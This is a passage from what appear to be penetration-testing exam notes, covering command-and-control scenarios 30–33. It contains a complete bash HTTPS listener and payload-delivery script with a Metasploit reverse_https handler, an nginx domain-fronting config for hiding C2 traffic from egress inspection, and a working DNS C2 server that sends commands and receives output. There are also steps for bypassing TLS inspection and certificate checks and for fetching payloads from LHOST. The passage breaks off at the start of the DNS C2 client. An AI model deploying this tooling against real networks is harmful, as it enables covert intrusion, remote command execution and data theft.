#   bash m09-https-listener.sh --mode serve  --port 443                   # HTTPS delivery (records UA, see --outdir for logs)
#   bash m09-https-listener.sh --mode msf   --port 443 --lhost LHOST      # generate and run the msf reverse_https handler
#   bash m09-https-listener.sh -h                                         # full help
# Placeholders: LHOST=--lhost (certificate CN and msf listen address), LPORT=--port (TLS listen port) and --to (local handler port),
#         DOMAIN=--domain (certificate CN/SAN, use the front-end domain for domain fronting), TARGET=--probe (optional TLS handshake probe target),
#         PAYLOAD=--payload (msf payload name)
# Test status: bash -n syntax check done; not tested in a real target environment (no socat/stunnel/msf on this host, needs lab environment validation)
set -uo pipefail

MODE="cert"
PORT="443"
TO=""
LHOST=""
DOMAIN=""
CERT="$HOME/osep/tools/cert.pem"
KEY="$HOME/osep/tools/key.pem"
PAYLOAD="windows/x64/meterpreter/reverse_https"
OUTDIR="$HOME/osep/logs"
SRVDIR="$HOME/osep/payloads"
TOOL="auto"
PROBE=""

usage() {
  cat <<'EOF'
m09-https-listener.sh - HTTPS listener / TLS forwarding / HTTPS delivery on the attacker machine (scenarios 30/31/33)

Usage:
  bash m09-https-listener.sh --mode <cert|ssl-test|serve|msf> [options]

Modes:
  cert       generate the self-signed certificate only (openssl) and print the SHA256 fingerprint
  ssl-test   start the TLS listener and forward the decrypted plaintext to the local handler (--to)
  serve      start the HTTPS file delivery service (records User-Agent, useful for troubleshooting application-layer filtering)
  msf        generate the msfconsole resource script and start the reverse_https handler

Options:
  --mode MODE      run mode (default cert)
  --port LPORT     TLS listen port (default 443)
  --to LPORT       local plaintext handler port (required for ssl-test, e.g. 4444)
  --lhost LHOST    local external IP (used as msf LHOST / certificate CN fallback)
  --domain DOMAIN  certificate CN and SAN (for domain fronting, use the front-end domain DOMAIN)
  --cert FILE      certificate path (default ~/osep/tools/cert.pem)
  --key FILE       private key path (default ~/osep/tools/key.pem)
  --payload NAME   msf payload (default windows/x64/meterpreter/reverse_https)
  --outdir DIR     log/resource file directory (default ~/osep/logs)
  --dir DIR        serve mode delivery directory (default ~/osep/payloads)
  --tool NAME      force a forwarding tool: socat|stunnel|sslh|python3 (default auto)
  --probe TARGET   additionally print TLS handshake info for TARGET:443
  -h, --help       show this help

Examples:
  bash m09-https-listener.sh --mode cert --domain DOMAIN
  bash m09-https-listener.sh --mode ssl-test --port 443 --to 4444
  bash m09-https-listener.sh --mode serve --port 8443 --dir ~/osep/payloads
  bash m09-https-listener.sh --mode msf --port 443 --lhost LHOST
EOF
}

info() { printf '[*] %s\n' "$*"; }
ok()   { printf '[+] %s\n' "$*"; }
err()  { printf '[-] %s\n' "$*" >&2; }
die()  { err "$*"; exit 2; }

have() { command -v "$1" >/dev/null 2>&1; }

while [[ $# -gt 0 ]]; do
  case "$1" in
    --mode)    MODE="${2:-}"; shift 2 ;;
    --port)    PORT="${2:-}"; shift 2 ;;
    --to)      TO="${2:-}"; shift 2 ;;
    --lhost)   LHOST="${2:-}"; shift 2 ;;
    --domain)  DOMAIN="${2:-}"; shift 2 ;;
    --cert)    CERT="${2:-}"; shift 2 ;;
    --key)     KEY="${2:-}"; shift 2 ;;
    --payload) PAYLOAD="${2:-}"; shift 2 ;;
    --outdir)  OUTDIR="${2:-}"; shift 2 ;;
    --dir)     SRVDIR="${2:-}"; shift 2 ;;
    --tool)    TOOL="${2:-}"; shift 2 ;;
    --probe)   PROBE="${2:-}"; shift 2 ;;
    -h|--help) usage; exit 0 ;;
    *)         err "unknown argument: $1"; usage; exit 2 ;;
  esac
done

[[ "$MODE" == "cert" || "$MODE" == "ssl-test" || "$MODE" == "serve" || "$MODE" == "msf" ]] \
  || die "--mode must be cert|ssl-test|serve|msf (current: ${MODE})"
[[ "$PORT" =~ ^[0-9]+$ ]] || die "--port must be a number (current: ${PORT})"
mkdir -p "$OUTDIR" || die "cannot create log directory $OUTDIR"

# ---------------- Certificate ----------------
gen_cert() {
  have openssl || die "openssl is missing (bundled with Kali; on macOS install it with Homebrew)"
  local cn="${DOMAIN:-${LHOST:-LHOST}}"
  mkdir -p "$(dirname "$CERT")" || die "cannot create certificate directory $(dirname "$CERT")"
  info "generating self-signed certificate CN=$cn -> $CERT"
  if ! openssl req -newkey rsa:2048 -nodes -keyout "$KEY" -x509 -days 365 -out "$CERT" \
        -subj "/CN=$cn" -addext "subjectAltName=DNS:$cn" 2>/dev/null; then
    # older openssl does not support -addext: fall back to the form without SAN
    openssl req -newkey rsa:2048 -nodes -keyout "$KEY" -x509 -days 365 -out "$CERT" \
      -subj "/CN=$cn" || die "openssl failed to generate the certificate"
  fi
  ok "certificate: $CERT"
  ok "private key: $KEY"
  echo "--- fingerprint (record it in your exam notes; use it for target-side trust or troubleshooting) ---"
  openssl x509 -in "$CERT" -noout -fingerprint -sha256
  openssl x509 -in "$CERT" -noout -subject -dates
}

ensure_cert() {
  if [[ -f "$CERT" && -f "$KEY" ]]; then
    ok "using existing certificate: $CERT"
    return 0
  fi
  info "certificate does not exist, generating it first"
  gen_cert
}

# ---------------- TLS termination forwarding (socat / stunnel / python3) ----------------
run_socat() {
  have socat || return 1
  info "tool: socat  OPENSSL-LISTEN:$PORT -> 127.0.0.1:${TO}"
  exec socat -v -lf "$OUTDIR/tls-$PORT.log" \
    "OPENSSL-LISTEN:$PORT,cert=$CERT,key=$KEY,verify=0,fork,reuseaddr" \
    "TCP:127.0.0.1:${TO}"
}

run_stunnel() {
  have stunnel || have stunnel4 || return 1
  local bin="stunnel"; have stunnel || bin="stunnel4"
  info "tool: $bin  listening on $PORT -> 127.0.0.1:${TO}"
  exec "$bin" -fd 0 <<EOF
foreground = yes
pid =
output = $OUTDIR/tls-$PORT.log
[c2]
cert = $CERT
key = $KEY
accept = 0.0.0.0:$PORT
connect = 127.0.0.1:$TO
EOF
}

run_python() {
  have python3 || return 1
  info "tool: python3 (built-in ssl forwarding, zero install)  TLS:$PORT -> 127.0.0.1:${TO}"
  info "handshake and error log: $OUTDIR/tls-$PORT.log"
  CERT="$CERT" KEY="$KEY" LPORT="$PORT" TOPORT="${TO}" LOGFILE="$OUTDIR/tls-$PORT.log" \
  python3 - <<'PY' 2>&1 | tee -a "$OUTDIR/tls-$PORT.log"
import datetime, os, socket, ssl, sys, threading

cert    = os.environ["CERT"]
key     = os.environ["KEY"]
lport   = int(os.environ["LPORT"])
toport  = int(os.environ["TOPORT"])

ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(cert, key)

srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
srv.bind(("0.0.0.0", lport))
srv.listen(32)
print("[*] %s TLS listen 0.0.0.0:%d -> 127.0.0.1:%d" %
      (datetime.datetime.now(), lport, toport), flush=True)

def pipe(a, b):
    try:
        while True:
            data = a.recv(4096)
            if not data:
                break
            b.sendall(data)
    except OSError:
        pass
    finally:
        for s in (a, b):
            try:
                s.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            try:
                s.close()
            except OSError:
                pass

def handle(conn, addr):
    try:
        tls = ctx.wrap_socket(conn, server_side=True)
    except (ssl.SSLError, OSError) as e:
        print("[-] %s TLS handshake failed: %s" % (addr[0], e), flush=True)
        conn.close()
        return
    print("[+] %s handshake complete %s %s" % (addr[0], tls.version(), tls.cipher()[0]), flush=True)
    try:
        up = socket.create_connection(("127.0.0.1", toport), 5)
    except OSError as e:
        print("[-] local handler 127.0.0.1:%d unreachable: %s (start the handler before running this script)" %
              (toport, e), flush=True)
        tls.close()
        return
    threading.Thread(target=pipe, args=(tls, up), daemon=True).start()
    pipe(up, tls)

while True:
    conn, addr = srv.accept()
    threading.Thread(target=handle, args=(conn, addr), daemon=True).start()
PY
}

run_sslh() {
  have sslh || die "sslh not found (Kali: apt install sslh); passthrough mode does not decrypt TLS and passes traffic straight to the local handler"
  info "tool: sslh (passthrough, TLS is decrypted by the backend handler itself)  $PORT -> 127.0.0.1:${TO}"
  [[ -n "${TO}" ]] || die "sslh mode needs --to to specify the backend port"
  exec sslh --listen "0.0.0.0:$PORT" --tls "127.0.0.1:${TO}" --foreground
}

do_ssl_test() {
  [[ -n "${TO}" ]] || die "ssl-test needs --to <local handler port>, e.g.: --port 443 --to 4444"
  ensure_cert
  info "workflow reminder: start the local plaintext handler first (e.g. msf reverse_http or ncat -lvnp ${TO}), then let this script do TLS termination"
  case "$TOOL" in
    socat)   run_socat ;;
    stunnel) run_stunnel || die "stunnel failed to start" ;;
    sslh)    run_sslh ;;
    python3) run_python ;;
    auto)
      run_socat || run_stunnel || run_python
      ;;
    *) die "--tool must be one of socat|stunnel|sslh|python3" ;;
  esac
}

# ---------------- HTTPS delivery ----------------
do_serve() {
  have python3 || die "serve mode needs python3"
  ensure_cert
  [[ -d "$SRVDIR" ]] || info "delivery directory $SRVDIR does not exist, put the PAYLOAD there first (or change --dir)"
  mkdir -p "$SRVDIR"
  info "HTTPS delivery on :$PORT  dir=$SRVDIR  log=$OUTDIR/https-$PORT.log"
  SRVDIR="$SRVDIR" CERT="$CERT" KEY="$KEY" LPORT="$PORT" \
  python3 - <<'PY' 2>&1 | tee -a "$OUTDIR/https-$PORT.log"
import datetime, http.server, os, socketserver, ssl

srvdir = os.environ["SRVDIR"]
lport  = int(os.environ["LPORT"])
os.chdir(srvdir)

class H(http.server.SimpleHTTPRequestHandler):
    def log_message(self, fmt, *args):
        ua = self.headers.get("User-Agent", "-")
        host = self.headers.get("Host", "-")
        print("%s %s host=%s ua=%s %s" %
              (datetime.datetime.now(), self.address_string(), host, ua, fmt % args))

class S(socketserver.ThreadingTCPServer):
    allow_reuse_address = True
    daemon_threads = True

httpd = S(("0.0.0.0", lport), H)
ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
ctx.load_cert_chain(os.environ["CERT"], os.environ["KEY"])
httpd.socket = ctx.wrap_socket(httpd.socket, server_side=True)
print("[*] https://0.0.0.0:%d serving %s" % (lport, srvdir), flush=True)
httpd.serve_forever()
PY
}

# ---------------- msf handler ----------------
do_msf() {
  have msfconsole || die "msfconsole not found (bundled with Kali)"
  [[ -n "$LHOST" ]] || die "msf mode needs --lhost LHOST"
  local rc="$OUTDIR/https-handler-$PORT.rc"
  cat > "$rc" <<EOF
use exploit/multi/handler
set PAYLOAD $PAYLOAD
set LHOST $LHOST
set LPORT $PORT
set ExitOnSession false
set EnableStageEncoding true
run -j
EOF
  ok "resource script: $rc"
  info "hint: if socat/stunnel already terminates TLS, msf should instead use reverse_http (plaintext) listening on 127.0.0.1:${TO},"
  info "      the msf mode of this script is for payloads that bring their own TLS (reverse_https) and connect straight to 443."
  exec msfconsole -q -r "$rc"
}

# ---------------- Optional: TLS handshake probe against the target ----------------
do_probe() {
  have openssl || return 0
  info "probing TLS on $PROBE:443 (to compare against 'target reaches public HTTPS fine / fails to reach us')"
  echo | timeout 8 openssl s_client -connect "$PROBE:443" -servername "$PROBE" 2>&1 \
    | grep -E "CONNECTED|subject=|issuer=|Protocol|Cipher|Verify return code|alert" | head -20
}

case "$MODE" in
  cert)     gen_cert ;;
  ssl-test) do_ssl_test ;;
  serve)    do_serve ;;
  msf)      do_msf ;;
esac

[[ -n "$PROBE" ]] && do_probe
exit 0
````

**Validation**: every stage on the path card is marked "path verified in practice" (delivery log GET / handshake log / session); after a drop, the callback still returns (with ExitOnSession false).

**Failure branches and alternatives**:
- The target requested stage 2 but the process was killed → static or behavioural detection; handle it per M05 scenarios 18–19 instead of changing addresses again.
- The request never arrived at all → check the proxy and the identity context against scenarios 28/29.
- Staged keeps failing → switch to a single-path stageless payload; if that still fails, check the listener payload bitness (x86/x64).

**Exam / OPSEC notes**: the biggest point-loser is assuming success because stage 1 worked — do not move on until you see the stage-2 session. Record the path card at every stage so you are not guessing URLs and ports from memory.

---

## Scenario 31: Only HTTPS is allowed out, but HTTPS inspection breaks the channel

**Situation**: the target reaches ordinary HTTPS sites, but your payload fails at the TLS handshake or at the request stage — there is proxy inspection, certificate trust, or application-layer (UA/path) filtering in the way.

**Assumptions**: the egress only allows 443/HTTPS; a TLS middlebox (MITM re-signing) may exist, or inspection that only allows whitelisted domains; your listener can serve HTTPS and show handshake and request logs.

**Prepare (attacker side)**: generate certificates and start HTTPS delivery/listening, with both certificate strategies ready:
- Self-signed: `openssl req -newkey rsa:2048 -nodes -keyout key.pem -x509 -days 365 -out cert.pem -subj "/CN=LHOST"` (passes when the target does not validate the root; **note the fingerprint** for troubleshooting).
- Trusted certificate: a public domain plus Let's Encrypt (most reliable when there is no MITM at the egress); if the lab network has an internal CA, you can import its root into the trust store instead.

**Procedure**:
1. Narrow it down point by point: can the target open TCP to your 443 (`Test-NetConnection LHOST -Port 443`)? Connects but TLS fails → certificate or middlebox problem. Cannot connect at all → the egress filters on IP/SNI.
2. Handshake failure, certificate triage: use the HTTPS listener log to see whether the handshake happened and what the client reported (untrusted certificate, hostname mismatch). PowerShell rejects a self-signed certificate by default → add `-SkipCertificateCheck` on the client (PS 7) or a `ServerCertificateValidationCallback` (PS 5, handled inside the script), or import the self-signed certificate into the target's trusted roots.
3. Middlebox MITM re-signing: the target trusts the middlebox root, so a self-signed certificate is guaranteed to fail → switch to a domain the middlebox allows plus a trusted certificate (see the failure branches and domain fronting, scenario 33).
4. Application-layer filtering, UA/path triage: disguise the request headers with a common browser UA (m09-https-listener.sh logs the UA so you can check it); keep paths and query strings unremarkable.
5. If HTTPS has to go through a proxy → combine with scenario 28: proxy parameters plus an HTTPS client.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m09-https-listener.sh` | HTTPS listener: msf reverse_https handler or TLS test mode, logging UA and handshakes | `--mode msf\|ssl-test --cert cert.pem --key key.pem` |
| `m09-domain-fronting-nginx.conf` | Front-end template when you need per-domain forwarding or SNI handling | see scenario 33 |
| `m09-proxy-aware-downloader.ps1` | HTTPS download with a certificate-validation switch | `-Url https://LHOST/PAYLOAD -SkipCertCheck` |

#### `m09-domain-fronting-nginx.conf` {#m09-domain-fronting-nginx-conf}

````nginx
# Purpose: domain fronting front-end config -- the TLS layer uses the front-end domain DOMAIN that the target permits (SNI + certificate),
#       the HTTP Host header carries the real back-end identifier URL, and nginx forwards the request to the back-end C2 (LHOST:LPORT) by Host.
#       egress inspection sees SNI/certificate/destination = DOMAIN (permitted); the back-end is decided only inside nginx by Host.
# Scenario: 33 (target permits only specific front-end addresses, direct back-end connection fails; lab infrastructure supports front-end/back-end separation), 31 (HTTPS inspection bypass)
# Dependencies: nginx (SNI split routing in the stream block needs the --with-stream_ssl_preread module; without that module, the http block alone can do Host-based split routing);
#       a TLS certificate for DOMAIN (self-signed works if the target does not validate or we already ignore certificate validation); back-end C2/delivery listener (m09-https-listener.sh)
# Usage:
#   1) replace all placeholders, then put it at /etc/nginx/nginx.conf (or include the http{} contents into an existing config)
#   2) nginx -t && nginx -s reload
#   3) verify from the target: curl -k --resolve DOMAIN:443:LHOST -H "Host: URL" https://DOMAIN/PAYLOAD -o PAYLOAD
# Placeholders: DOMAIN=front-end domain (the target is allowed to reach it; used for SNI and the certificate), URL=back-end identifier (put it in the Host header, nginx routes by it),
#         LHOST=back-end C2 listen address, LPORT=back-end C2 port, PAYLOAD=delivered file name
# Test status: not tested on a local nginx; the config structure was checked by hand against nginx syntax (map / upstream / if+proxy_pass usage)

worker_processes auto;

events {
    worker_connections 1024;
}

http {
    default_type application/octet-stream;
    sendfile on;
    keepalive_timeout 15;

    # ---- Back-end identifier check: Host header equal to URL goes to the back-end; anything else (including DOMAIN itself) returns the cover page ----
    # in nginx "1" is true / "0" is false, so use 0/1 here instead of yes/no
    map $http_host $is_backend {
        default        0;
        "URL"          1;
    }

    upstream c2_backend {
        server LHOST:LPORT;
        keepalive 8;
    }

    # ---- Triage log: records SNI, Host and UA together (scenario 31 triage for "handshake succeeds but the request is blocked") ----
    log_format fronting '$remote_addr [$time_local] sni=$ssl_server_name '
                        'host=$http_host ua="$http_user_agent" '
                        'proto=$ssl_protocol req="$request" status=$status backend=$is_backend';
    access_log /var/log/nginx/fronting-access.log fronting;
    error_log  /var/log/nginx/fronting-error.log warn;

    # ---- Front-end: terminates TLS on 443, the certificate belongs to DOMAIN ----
    server {
        listen 443 ssl default_server;
        server_name DOMAIN;

        ssl_certificate     /etc/nginx/certs/DOMAIN.crt;
        ssl_certificate_key /etc/nginx/certs/DOMAIN.key;
        ssl_protocols       TLSv1.2 TLSv1.3;
        ssl_prefer_server_ciphers off;
        ssl_session_cache   shared:fronting:1m;

        # SNI notes (important):
        #   - the client must make SNI = DOMAIN (with curl, specify --resolve DOMAIN:443:LHOST; with PowerShell just use https://DOMAIN/)
        #   - if the client also sets SNI to URL, egress inspection sees a domain that is not permitted and domain fronting fails
        #   - nginx $ssl_server_name is only for logging; this config does no SNI validation (otherwise it would reject Host=URL requests)

        # do not let buffering truncate large requests (staged payload / uploads)
        client_max_body_size 64m;
        proxy_request_buffering off;
        proxy_buffering off;

        # the cover response and the back-end response are both returned as plain text so the site does not look anomalous
        default_type text/plain;

        # explicit path entry: even if the Host check fails, a fixed path can still forward to the back-end (handy for a quick pre-exam check)
        location = /PAYLOAD {
            proxy_pass http://c2_backend;
            proxy_http_version 1.1;
            proxy_set_header Host              $http_host;
            proxy_set_header X-Forwarded-For   $remote_addr;
            proxy_set_header X-Forwarded-Proto https;
            proxy_set_header Connection        "";
        }

        location / {
            # Host=URL -> forward to the back-end C2; keep the original Host so the back-end can identify its own vhost by Host
            if ($is_backend) {
                proxy_pass http://c2_backend;
                proxy_http_version 1.1;
                proxy_set_header Host              $http_host;
                proxy_set_header X-Forwarded-For   $remote_addr;
                proxy_set_header Connection        "";
                break;
            }

            # any other Host (including a normal visit to DOMAIN) -> return a harmless page as cover
            return 200 "ok\n";
        }
    }

    # ---- Plaintext 80: only for local/nginx self connectivity tests, no forwarding ----
    server {
        listen 80 default_server;
        server_name DOMAIN;
        location / { return 200 "ok\n"; }
    }
}

# ============================================================
# Optional: SNI split routing in the stream block (requires nginx built with --with-stream_ssl_preread)
# Purpose: on the same port, traffic with SNI=DOMAIN goes to the back-end C2 and any other SNI goes to a local decoy site.
# Use this or the http block above, not both; if you enable both, give port 443 to stream (change the http block to listen 8443 or similar).
# ============================================================
# stream {
#     log_format sni '$remote_addr sni=$ssl_preread_server_name -> $upstream_addr';
#     access_log /var/log/nginx/fronting-sni.log sni;
#
#     map $ssl_preread_server_name $sni_upstream {
#         default        127.0.0.1:8080;    # no match: local decoy site
#         "DOMAIN"       LHOST:LPORT;       # SNI=DOMAIN: back-end C2 (the back-end terminates TLS itself)
#     }
#
#     server {
#         listen 443;
#         ssl_preread on;                   # read SNI only, no TLS termination
#         proxy_pass $sni_upstream;
#     }
# }

# ============================================================
# Verification steps (do one harmless GET before the exam)
#   1) confirm from the target that only DOMAIN is permitted:
#        curl -sI https://DOMAIN/            -> expect 200 "ok"
#   2) fetch the payload with the back-end Host (SNI is still DOMAIN):
#        curl -k --resolve DOMAIN:443:LHOST -H "Host: URL" https://DOMAIN/PAYLOAD -o PAYLOAD
#   3) the back-end log (the log from m09-https-listener.sh --mode serve) should show that request, with Host=URL
#   4) PowerShell form (as written in the scenario 33 docs):
#        $c = New-Object Net.WebClient; $c.Headers.Add("Host","URL");
#        $c.DownloadString("https://DOMAIN/PAYLOAD")
#
# Triage order when it does not work
#   - 421/403/502 returned: the front-end (or the real CDN) validated SNI against Host -> that infrastructure does not support domain fronting; switch to scenario 28 (proxy) or 32 (DNS)
#   - certificate error: the client must ignore certificate validation (curl -k / PowerShell ServerCertificateValidationCallback),
#     otherwise you must hold a trusted certificate for DOMAIN
#   - no back-end log: check whether LHOST:LPORT in the upstream is really listening (ss -ltnp), and whether the map matched $is_backend
# ============================================================
````

**Validation**: the handshake log shows the target completing TLS (or msf shows a session); the difference between "the target reaches public HTTPS fine" and "the target fails against us" has been explained and eliminated.

**Failure branches and alternatives**:
- The middlebox re-signs and the chain is validated → find a domain the middlebox allows and use domain fronting (33), or check whether the lab grants an exemption.
- The egress whitelists by SNI/destination IP → domain fronting (33); if it will not even resolve non-whitelisted domains → DNS channel (32).
- The client skips validation but the handshake still fails → check the TLS version and cipher suites (WinHTTP defaults are usually fine; older systems may need a downgraded configuration).

**Exam / OPSEC notes**: a self-signed fingerprint stands out — when troubleshooting, first confirm the fingerprint in the listener log is yours. Keep the UA consistent with the delivery/download stages instead of mixing a default and a disguise. HTTPS does not encrypt the Host/SNI that a proxy sees, so never put secrets in the URL.

---

## Scenario 32: Plain HTTP(S) is dead, but the course lab allows a DNS channel

**Situation**: the target executes code, but neither direct connections nor the usual proxy work; DNS egress still does.

**Assumptions**: the lab/exam environment explicitly allows a DNS tunnel (course text §14.7); you have a domain (or a domain allowed inside the lab network) and can point its NS records at the attacker box, or the target can reach the attacker directly on UDP 53; the target can run our client (Python 3 needs an interpreter — without one, switch to dnscat2/iodine or the PowerShell port described in the script comments).

**Prepare (attacker side)**: this module ships a minimal DNS C2 pair (`m09-dns-c2-server.py` + `m09-dns-c2-client.py`) for "confirm the DNS channel works + push commands and pull output back". Bring in a full tunnel tool such as dnscat2/iodine only if you need one. This lab has the target talk straight to the attacker box on UDP 53:

```bash
# attacker machine: start the authoritative-style DNS C2 server (binding 53 needs root)
sudo python3 m09-dns-c2-server.py --listen 0.0.0.0 --port 53 \
    --domain c2.example --outdir ~/osep/logs
# type into the server console:  SESSIONID  whoami /priv     # send a command to that session
```

**Procedure**:
1. Confirm DNS reachability from the target: `nslookup c2.example LHOST` (direct) or normal recursive `nslookup`, depending on the environment.
2. Start the client on the target (with no Python, deliver an interpreter first or switch to the dnscat2 binary):
```bash
python3 m09-dns-c2-client.py --server LHOST --port 53 --domain c2.example \
    --session a1b2c3d4 --interval 2
```
3. The client heartbeat carries the session ID → issue a command to that session from the server console → the client decodes and runs it locally → the output travels back in chunks under the `o<hex>` label (keep one command's output within 1–2 KB; split anything larger).
4. Confirm the server received the output (printed to the console, or written under outdir). At the egress a DNS query is just an ordinary A query; it never crosses the proxy.
5. Once the channel is stable, deliver stage 2 over DNS as well (nothing to disk, few requests), or use DNS only for emergency return traffic.

**Scripts used**:
| Script | Purpose | Key parameters |
|---|---|---|
| `m09-dns-c2-server.py` | DNS C2 server (UDP 53, answers with A records) | `--listen 0.0.0.0 --port 53 --domain c2.example` |
| `m09-dns-c2-client.py` | DNS C2 client (heartbeat, receive commands, return output) | `--server LHOST --session a1b2c3d4 --interval 2` |

#### `m09-dns-c2-server.py` {#m09-dns-c2-server-py}

````python
#!/usr/bin/env python3
"""Purpose: minimal DNS C2 server -- encodes commands into DNS A record replies sent back to the target, and receives output the target returns as hex in subdomains.
        Works with m09-dns-c2-client.py to confirm the DNS channel is usable and to exchange a small number of commands/outputs (minimal implementation of the section 14.7 idea).

Scenario: 32 (emergency callback when HTTP(S) is blocked but a DNS channel is allowed). For a full high-volume tunnel use dnscat2/iodine instead; this pair only does "works or not + send commands and get output back".

Dependencies: Python 3.7+ standard library (socket/struct). Needs root to listen on 53, or the target must be able to reach this host's UDP port directly.
      Domain requirements: point the NS of a lab-permitted domain at this host, or have the client connect straight to this host's IP (this implementation defaults to direct mode, the simplest option).

Usage:
    sudo python3 m09-dns-c2-server.py --port 53 --domain c2.example --outdir ~/osep/logs
    Server console (interactive mode):
        list                        # list sessions whose heartbeat has been seen
        send <SESSION> whoami /priv # queue one command for that session (length <= 40 bytes)
        quit
    Verify (in another terminal):
        dig @LHOST c2.example        # if there is no dig, tcpdump -i any udp port 53

Placeholders: LHOST=attacker machine IP; SESSION=8-hex-char session id chosen by the client; c2.example=the domain suffix you control

Test status: compiles under Python3 syntax on Kali/macOS, and a direct loopback test with the client was done on this host at 127.0.0.1:5353
          (server received heartbeats, queued commands, received returned output). The DNS recursion/NS deployment form was not verified on a real domain; before the exam, run the harmless checks in the scenario 32 steps.
"""
import argparse
import binascii
import os
import socket
import struct
import sys
import threading

MAX_CMD = 40          # max command bytes returned per query (4 bytes/A record * 10 A records)
CMD_END = b"\n"       # command terminator
pools = {}            # session -> {"in": bytes to send, "out": bytes received for the log}
sessions = {}         # session -> last-seen ts (simple counter)
_lock = threading.Lock()

def parse_qname(data, off):
    """Parse a DNS name (including compression pointers); returns (name_str, end offset)."""
    labels, end = [], None
    while True:
        ln = data[off]
        if ln == 0:
            end = off + 1
            break
        if ln & 0xC0 == 0xC0:                    # compression pointer: 0xC0 0xXX, points to an offset in the packet
            ptr = struct.unpack(">H", data[off:off + 2])[0] & 0x3FFF
            if end is None:
                end = off + 2
            off = ptr
            continue
        labels.append(data[off + 1:off + 1 + ln].decode("ascii", "ignore"))
        off += 1 + ln
    return ".".join(labels), end

def parse_query(data):
    """Parse the query header + the first question; returns (tid, qname, end offset of the question section)."""
    if len(data) < 12:
        return None
    tid = struct.unpack(">H", data[:2])[0]
    qd = struct.unpack(">H", data[4:6])[0]
    if qd < 1:
        return None
    qname, off = parse_qname(data, 12)
    return tid, qname.lower(), off + 4          # skip qtype+qclass

def encode_name(name):
    """Encode a domain name string of the form 'a.b.c' into DNS wire format (each label <=63 chars)."""
    out = b""
    for label in name.split("."):
        b = label.encode("ascii")
        if len(b) > 63:
            raise ValueError("label too long: " + label)
        out += bytes([len(b)]) + b
    return out + b"\x00"

def build_reply(tid, qname, rdatas=None):
    """Build a standard reply: echo the question + N A records (rdatas is a list of 4-byte rdata)."""
    rdatas = rdatas or []
    flags = 0x8180                              # QR=1 RD=1 RA=1
    hdr = struct.pack(">HHHHH", tid, flags, 1, len(rdatas), 0, 0)
    q = encode_name(qname) + struct.pack(">HH", 1, 1)      # qtype=A qclass=IN
    ans = b""
    for r in rdatas:
        ans += b"\xc0\x0c" + struct.pack(">HHIH", 1, 1, 1, 4) + r   # name pointer+A+IN+ttl1+rdlen4+rdata
    return hdr + q + ans

def chunk_cmd(cmd, max_cmd=MAX_CMD):
    """Split the command bytes into chunks of length <=max_cmd (a multiple of 4); returns [(chunk, is_last)]."""
    chunks = []
    for i in range(0, len(cmd), max_cmd):
        piece = cmd[i:i + max_cmd]
        last = i + max_cmd >= len(cmd)
        chunks.append((piece, last))
    return chunks

def pack_rdatas(chunk):
    """Split the byte chunk into groups of 4 bytes (last group zero-padded) for use as A record rdata."""
    out = []
    for i in range(0, len(chunk), 4):
        out.append(chunk[i:i + 4].ljust(4, b"\x00"))
    return out

def handle(data, domain, outdir):
    parsed = parse_query(data)
    if not parsed:
        return b""
    tid, qname, _ = parsed
    if not qname.endswith("." + domain) and qname != domain:
        return b""                              # not a query for our domain: drop it
    head = qname[: -(len(domain) + 1)] if qname != domain else ""
    parts = head.split(".")
    if len(parts) < 2:
        return b""
    kind, session = parts[0], parts[1]
    if not all(c in "0123456789abcdef" for c in session) or len(session) > 16:
        return b""

    with _lock:
        pools.setdefault(session, {"in": b"", "out": b""})
        if kind == "h":                         # heartbeat: also picks up commands (encoded in the reply A records)
            sessions[session] = sessions.get(session, 0) + 1
            buf = pools[session]["in"]
            take = buf[:MAX_CMD]
            if take:
                pools[session]["in"] = buf[len(take):]
                print(f"[>] session={session} sending {len(take)} bytes", flush=True)
                return build_reply(tid, qname, pack_rdatas(take))
            return build_reply(tid, qname)      # no command queued: empty reply
        if kind == "o":                         # output return: o.<session>.<hexdata>.<domain>
            hexdata = "".join(parts[2:])
            try:
                raw = binascii.unhexlify(hexdata)
            except Exception:
                return b""
            pools[session]["out"] += raw
            fname = os.path.join(outdir, f"{session}.out")
            with open(fname, "ab") as f:
                f.write(raw + b"\n")
            print(f"[<] session={session} received {len(raw)} bytes -> {fname}", flush=True)
            return build_reply(tid, qname)
    return b""

def console(domain):
    print("[*] console: list | send <SESSION> <cmd(<=40B)> | quit", flush=True)
    for line in sys.stdin:
        line = line.strip()
        if line == "quit":
            os._exit(0)
        if line == "list":
            print(f"[*] active sessions: {sorted(sessions)}", flush=True)
        elif line.startswith("send "):
            rest = line[5:].split(" ", 1)
            if len(rest) != 2:
                print("[-] usage: send <SESSION> <command>", flush=True)
                continue
            sid, cmd = rest[0], rest[1].encode()
            if len(cmd) > 512:
                print("[-] command too long (>512B), split it and resend (have the client return output in chunks)", flush=True)
                continue
            with _lock:
                pools.setdefault(sid, {"in": b"", "out": b""})
                pools[sid]["in"] += cmd + CMD_END
            print(f"[>] queued for {sid}: {cmd.decode(errors='replace')} (delivered over {-(len(cmd) // -MAX_CMD)} heartbeats)", flush=True)

def main():
    ap = argparse.ArgumentParser(description="minimal DNS C2 server (scenario 32)")
    ap.add_argument("--listen", default="0.0.0.0")
    ap.add_argument("--port", type=int, default=53)
    ap.add_argument("--domain", required=True, help="the domain suffix we control, e.g. c2.example")
    ap.add_argument("--outdir", default=".")
    args = ap.parse_args()
    os.makedirs(args.outdir, exist_ok=True)

    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.bind((args.listen, args.port))
    print(f"[*] DNS C2 listening {args.listen}:{args.port}  domain={args.domain}  outdir={args.outdir}", flush=True)

    threading.Thread(target=console, args=(args.domain,), daemon=True).start()
    while True:
        data, addr = s.recvfrom(4096)
        reply = handle(data, args.domain, args.outdir)
        if reply:
            s.sendto(reply, addr)

if __name__ == "__main__":
    main()
````

#### `m09-dns-c2-client.py` {#m09-dns-c2-client-py}

````python
#!/usr/bin/env python3
"""Purpose: minimal DNS C2 client -- pairs with m09-dns-c2-server.py, uses DNS queries as a heartbeat to fetch commands and send back command output.
        Everything uses the Python standard library only (builds DNS packets with socket itself, no dnspython / requests dependency),
        so it runs directly on targets that have no third-party libraries.

Scenario: 32 (emergency command channel when HTTP(S) and proxies are both blocked but the lab/exam environment allows a DNS channel).

